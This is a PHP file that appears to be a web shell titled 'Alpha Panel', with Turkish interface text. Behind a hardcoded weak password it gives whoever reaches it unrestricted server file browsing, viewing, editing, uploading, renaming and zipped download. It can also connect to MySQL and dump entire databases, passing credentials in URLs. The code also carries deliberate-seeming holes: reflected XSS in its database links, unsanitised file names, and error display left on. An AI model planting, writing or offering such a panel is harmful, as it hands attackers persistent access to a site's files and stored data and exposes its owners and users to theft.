<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);
set_time_limit(0);
ini_set('memory_limit', '1024M');
session_start();

/* ========= AYAR ========= */
$PASSWORD = '123456'; // değiştir
/* ======================= */

if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: ".$_SERVER['PHP_SELF']);
    exit;
}

/* ========= LOGIN ========= */
if (!isset($_SESSION['auth'])) {
    if (isset($_POST['pass']) && $_POST['pass'] === $PASSWORD) {
        $_SESSION['auth'] = true;
        header("Location: ".$_SERVER['PHP_SELF']);
        exit;
    }
    ?>
    <html><body style="background:#111;color:#eee;font-family:Arial">
    <form method="post" style="width:320px;margin:120px auto">
        <h3>Alpha Panel</h3>
        <input type="password" name="pass" placeholder="Şifre" style="width:100%;padding:10px">
        <br><br><button style="width:100%;padding:10px">Giriş</button>
    </form></body></html>
    <?php exit;
}

/* ========= SEKME ========= */
$tab = isset($_GET['tab']) ? $_GET['tab'] : 'files';

/* ============================================================
   ====================== FILE MANAGER ========================
   ============================================================ */

$path = isset($_GET['path']) ? realpath($_GET['path']) : realpath(getcwd());
if (!$path) $path = DIRECTORY_SEPARATOR;

function zip_it($src, $zipname) {
    $zip = new ZipArchive();
    $zip->open($zipname, ZipArchive::CREATE);
    if (is_dir($src)) {
        $it = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($src, FilesystemIterator::SKIP_DOTS),
            RecursiveIteratorIterator::SELF_FIRST
        );
        foreach ($it as $f) {
            $fp = $f->getRealPath();
            $local = substr($fp, strlen($src) + 1);
            if ($f->isDir()) $zip->addEmptyDir($local);
            else $zip->addFile($fp, $local);
        }
    } else {
        $zip->addFile($src, basename($src));
    }
    $zip->close();
}

if ($tab === 'files' && isset($_GET['zip'])) {
    $target = realpath($_GET['zip']);
    if (!$target) die("Hedef yok");
    $zipName = basename($target)."_".date("Ymd_His").".zip";
    zip_it($target, $zipName);
    header("Content-Type: application/zip");
    header("Content-Disposition: attachment; filename=$zipName");
    header("Content-Length: ".filesize($zipName));
    readfile($zipName);
    unlink($zipName);
    exit;
}

if ($tab === 'files' && isset($_GET['view'])) {
    $f = realpath($_GET['view']);
    if (!$f || !is_file($f)) die("Dosya yok");
    echo "<pre style='background:#000;color:#0f0;padding:15px'>".
         htmlspecialchars(file_get_contents($f)).
         "</pre>";
    exit;
}

if ($tab === 'files' && isset($_GET['edit'])) {
    $f = realpath($_GET['edit']);
    if (!$f || !is_file($f)) die("Dosya yok");
    if (isset($_POST['save'])) {
        file_put_contents($f, $_POST['content']);
        header("Location: ?tab=files&path=".urlencode(dirname($f)));
        exit;
    }
    ?>
    <html><body style="background:#111;color:#eee;font-family:Arial">
    <h3><?php echo htmlspecialchars($f); ?></h3>
    <form method="post">
        <textarea name="content" style="width:100%;height:80vh;background:#000;color:#0f0"><?php
            echo htmlspecialchars(file_get_contents($f));
        ?></textarea><br>
        <button name="save">Kaydet</button>
        <a href="?tab=files&path=<?php echo urlencode(dirname($f)); ?>">İptal</a>
    </form>
    </body></html>
    <?php exit;
}

if ($tab === 'files' && isset($_POST['rename_from'], $_POST['rename_to'])) {
    $from = realpath($_POST['rename_from']);
    $to = dirname($from).DIRECTORY_SEPARATOR.$_POST['rename_to'];
    if ($from && !file_exists($to)) rename($from, $to);
    header("Location: ?tab=files&path=".urlencode(dirname($from)));
    exit;
}

if ($tab === 'files' && !empty($_FILES['files'])) {
    foreach ($_FILES['files']['tmp_name'] as $i => $tmp) {
        if ($tmp) move_uploaded_file($tmp, $path.DIRECTORY_SEPARATOR.$_FILES['files']['name'][$i]);
    }
    header("Location: ?tab=files&path=".urlencode($path));
    exit;
}

/* ============================================================
   ======================= SQL MANAGER =========================
   ============================================================ */

function export_db($conn, $db, $table = null) {
    mysqli_select_db($conn, $db);
    $out = "-- Export: $db\nSET NAMES utf8mb4;\n\n";
    $tables = array();

    if ($table) {
        $tables[] = $table;
    } else {
        $r = mysqli_query($conn, "SHOW TABLES");
        while ($row = mysqli_fetch_row($r)) $tables[] = $row[0];
    }

    foreach ($tables as $t) {
        $r = mysqli_query($conn, "SHOW CREATE TABLE `$t`");
        $row = mysqli_fetch_assoc($r);
        $out .= "\n".$row['Create Table'].";\n\n";

        $r = mysqli_query($conn, "SELECT * FROM `$t`");
        while ($d = mysqli_fetch_assoc($r)) {
            $c = array(); $v = array();
            foreach ($d as $k => $val) {
                $c[] = "`$k`";
                $v[] = "'".mysqli_real_escape_string($conn, $val)."'";
            }
            $out .= "INSERT INTO `$t` (".implode(",", $c).") VALUES (".implode(",", $v).");\n";
        }
    }
    return $out;
}

if ($tab === 'sql' && isset($_GET['export_db'])) {
    $conn = @mysqli_connect($_GET['h'], $_GET['u'], $_GET['p']);
    if (!$conn) die("DB bağlantı hatası");
    $sql = export_db($conn, $_GET['export_db']);
    if (class_exists('ZipArchive')) {
        $zipName = $_GET['export_db']."_".date("Ymd_His").".zip";
        $zip = new ZipArchive();
        $zip->open($zipName, ZipArchive::CREATE);
        $zip->addFromString($_GET['export_db'].".sql", $sql);
        $zip->close();
        header("Content-Type: application/zip");
        header("Content-Disposition: attachment; filename=$zipName");
        header("Content-Length: ".filesize($zipName));
        readfile($zipName);
        unlink($zipName);
    } else {
        header("Content-Disposition: attachment; filename=".$_GET['export_db'].".sql");
        echo $sql;
    }
    exit;
}

/* ======================= ARAYÜZ ======================= */
?>
<!doctype html>
<html>
<head><meta charset="utf-8"><title>Alpha Panel</title></head>
<body style="background:#0b0b0b;color:#eee;font-family:Arial">

<h2>Alpha Panel</h2>
<a href="?tab=files">📂 File Manager</a> |
<a href="?tab=sql">🗄 SQL Manager</a> |
<a href="?logout=1" style="color:red">Çıkış</a>
<hr>

<?php if ($tab === 'files'): ?>
<b>Dizin:</b> <?php echo htmlspecialchars($path); ?><br><br>
<a href="?tab=files&path=<?php echo urlencode(dirname($path)); ?>">⬅ Üst</a> |
<a href="?tab=files&zip=<?php echo urlencode($path); ?>">📦 ZIP</a>

<form method="post" enctype="multipart/form-data">
    <input type="file" name="files[]" multiple>
    <button>Upload</button>
</form>

<table width="100%" cellpadding="6">
<?php
$items = @scandir($path);
foreach ($items as $i):
    if ($i === '.') continue;
    $full = $path.DIRECTORY_SEPARATOR.$i;
?>
<tr>
<td>
<?php if (is_dir($full)): ?>
📁 <a href="?tab=files&path=<?php echo urlencode($full); ?>"><?php echo htmlspecialchars($i); ?></a>
<?php else: ?>
📄 <?php echo htmlspecialchars($i); ?>
<?php endif; ?>
</td>
<td>
<a href="?tab=files&zip=<?php echo urlencode($full); ?>">ZIP</a>
<?php if (is_file($full)): ?>
 | <a href="?tab=files&view=<?php echo urlencode($full); ?>">GÖR</a>
 | <a href="?tab=files&edit=<?php echo urlencode($full); ?>">EDİT</a>
<?php endif; ?>
<form method="post" style="display:inline">
<input type="hidden" name="rename_from" value="<?php echo htmlspecialchars($full); ?>">
<input type="text" name="rename_to" placeholder="Yeni ad" style="width:80px">
<button>Rename</button>
</form>
</td>
</tr>
<?php endforeach; ?>
</table>

<?php else: ?>
<form method="post">
<input name="db_host" placeholder="Host" value="localhost">
<input name="db_user" placeholder="User">
<input name="db_pass" placeholder="Pass">
<button>Bağlan</button>
</form>

<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $c = @mysqli_connect($_POST['db_host'], $_POST['db_user'], $_POST['db_pass']);
    if ($c) {
        $dbs = mysqli_query($c, "SHOW DATABASES");
        while ($d = mysqli_fetch_assoc($dbs)) {
            echo "<b>{$d['Database']}</b> - <a href='?tab=sql&export_db={$d['Database']}&h={$_POST['db_host']}&u={$_POST['db_user']}&p={$_POST['db_pass']}'>Export</a><br>";
        }
    } else {
        echo "<p style='color:red'>DB bağlantı hatası</p>";
    }
}
?>
<?php endif; ?>

</body>
</html>
